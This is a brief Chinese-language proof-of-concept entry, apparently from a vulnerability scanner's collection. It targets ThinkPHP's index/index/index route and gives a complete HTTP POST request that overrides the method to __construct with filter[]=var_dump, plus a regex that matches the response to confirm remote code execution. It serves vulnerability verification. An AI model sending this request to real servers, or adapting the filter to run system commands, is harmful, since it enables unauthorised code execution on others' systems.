﻿# thinkphp index construct rce

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /index.php?s=index/index/index HTTP/1.1
Content-Type: application/x-www-form-urlencoded

s=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump
```

> 响应代码特征：-1

> 响应内容特征：^(?=.*?(?:4e5e5d7364f443e28fbf0d3ae744a59a|var_dump)).*?$

> 上传文件定位：

> 验证文件来源：thinkphp_index_construct_rce.poc
